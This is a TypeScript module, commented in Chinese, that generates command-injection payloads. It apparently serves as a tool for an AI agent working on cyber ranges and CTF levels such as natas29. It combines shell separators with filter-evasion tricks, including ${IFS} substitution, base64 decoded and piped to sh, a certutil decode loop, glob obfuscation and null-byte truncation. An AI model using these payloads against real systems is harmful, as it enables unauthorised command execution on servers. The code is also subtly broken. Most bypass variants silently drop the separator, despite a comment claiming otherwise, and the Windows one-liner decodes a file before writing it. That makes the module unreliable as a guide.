/**
 * 命令注入 payload 生成器（cyber-range 经验固化）
 *
 * 经验来源：
 *  - `;whoami`、`|id`（跨靶场三步曲：DNS lookup/ping 页命令执行）
 *  - Perl ARGV magic：`cmd |` 必须有空格（`cmd|` 被当文件读取），`|` 结尾触发管道执行
 *  - wsl 工具 command 里 `$_SERVER` 等 `$` 变量会被 bash 展开吞掉 → 复杂脚本 write 到文件再执行
 *  - curl -d 传含 `$`/括号内容会被 shell 展开 → 用 --data-urlencode 或 python 脚本
 *  - 反序列化 payload 含引号/括号 → 用 python 提交避免多层转义
 *
 * 设计：策略（选分隔符/绕过）归模型，生成（变体矩阵）归工具——窄而深、可组合。
 */

/** 分隔符种类 */
export type SepKind = 'semicolon' | 'pipe' | 'and' | 'or' | 'newline' | 'subshell' | 'backtick'

/** 绕过种类 */
export type BypassKind = 'none' | 'space_ifs' | 'base64' | 'case' | 'glob' | 'null_byte' | 'path_concat'

export interface CmdiOptions {
  command: string
  separators?: SepKind[]
  bypasses?: BypassKind[]
  /** 环境：sh/bash/cmd/perl（影响语法与注释符） */
  shell?: 'sh' | 'bash' | 'cmd' | 'perl'
}

export interface CmdiPayload {
  /** payload 原文 */
  payload: string
  /** 适用场景/构造说明 */
  note: string
  /** 触发的分隔符 */
  sep: SepKind
  /** 启用的绕过 */
  bypass: BypassKind
}

/** 分隔符 → (模板, 说明) */
const SEP_TEMPLATES: Record<SepKind, { tpl: (cmd: string) => string; note: string }> = {
  semicolon: { tpl: (c) => `;${c}`, note: '分号：忽略前命令退出码，继续执行（sh/bash/cmd 通用）' },
  pipe: { tpl: (c) => `|${c}`, note: '管道：前命令输出作为后命令输入（无空格亦可，常用于短 payload）' },
  and: { tpl: (c) => `&&${c}`, note: 'AND：前命令成功才执行（逻辑连接，规避黑名单分隔符时常见替代）' },
  or: { tpl: (c) => `||${c}`, note: 'OR：前命令失败才执行（常用于 `cd /tmp || id` 这类利用）' },
  newline: { tpl: (c) => `\n${c}`, note: '换行：%0a 编码后可绕过单行过滤（HTTP 参数需 URL 编码）' },
  subshell: { tpl: (c) => `$(${c})`, note: '子 shell：命令替换，输出内联进上下文（bash 特性，过滤 `;|&` 时有效）' },
  backtick: { tpl: (c) => `\`${c}\``, note: '反引号：命令替换（sh/bash 通用，过滤 `$()` 时替代）' },
}

/** 绕过 → (包装函数, 说明) */
const BYPASS_WRAPPERS: Record<BypassKind, { wrap: (cmd: string, shell?: string) => string; note: string }> = {
  none: {
    wrap: (c: string) => c,
    note: '无绕过（原始命令）',
  },
  space_ifs: {
    wrap: (c) => c.replace(/ /g, '${IFS}'),
    note: '空格→${IFS}：绕过按空格切词的过滤器（bash/sh）',
  },
  base64: {
    wrap: (c, shell) => {
      const b64 = Buffer.from(c).toString('base64')
      if (shell === 'cmd') return `for /f %i in ('certutil -decode -f %TEMP%\\x.b64 2>nul') do %i & echo ${b64}>%TEMP%\\x.b64`
      return `echo ${b64} | base64 -d | sh`
    },
    note: 'base64 编码执行：绕过命令内容过滤（含空格/关键字），bash 侧 echo|base64 -d|sh',
  },
  case: {
    wrap: (c) => c,
    note: '大小写混淆：适用于 Windows cmd（不区分大小写）或目标侧做大小写匹配过滤；bash 需配合 ${VAR^^} 或通配符',
  },
  glob: {
    wrap: (c) => c.replace(/([a-zA-Z])/g, (m) => `[${m.toLowerCase()}${m.toUpperCase()}]`),
    note: 'glob 混淆：`nata[s]` 式字符类——匹配字面量但规避字符串过滤（bash 路径展开，natas29 实战）',
  },
  null_byte: {
    wrap: (c) => c + '\0',
    note: 'null 字节：%00 截断（C/Perl 字符串终止），用于绕过后缀拼接如 `|cat file%00.txt`（Perl open() 注入，natas29 实战）',
  },
  path_concat: {
    wrap: (c) => c.replace(/\/([a-z])/gi, (m, ch: string) => `/${ch}${ch.toUpperCase() === ch ? ch.toLowerCase() : ch.toUpperCase()}`),
    note: '路径大小写交替：Windows 文件系统不区分大小写，绕过路径字符串过滤',
  },
}

export function generateCmdi(options: CmdiOptions): CmdiPayload[] {
  const shell = options.shell ?? 'sh'
  const seps = options.separators?.length ? options.separators : (Object.keys(SEP_TEMPLATES) as SepKind[])
  const bypasses = options.bypasses?.length ? options.bypasses : (Object.keys(BYPASS_WRAPPERS) as BypassKind[])
  const out: CmdiPayload[] = []
  for (const sep of seps) {
    const tpl = SEP_TEMPLATES[sep]!
    for (const bypass of bypasses) {
      const wrapper = BYPASS_WRAPPERS[bypass]!
      const base = tpl.tpl(options.command)
      const payload = bypass === 'none' || bypass === 'case' || bypass === 'null_byte'
        ? wrapper.wrap(base)
        : wrapper.wrap(options.command, shell) // 空格/base64/glob/path 先作用于命令本体再套分隔符
      out.push({
        payload: bypass === 'null_byte' ? base + '\0' : payload,
        note: `${tpl.note}；${wrapper.note}`,
        sep,
        bypass,
      })
    }
  }
  return out
}
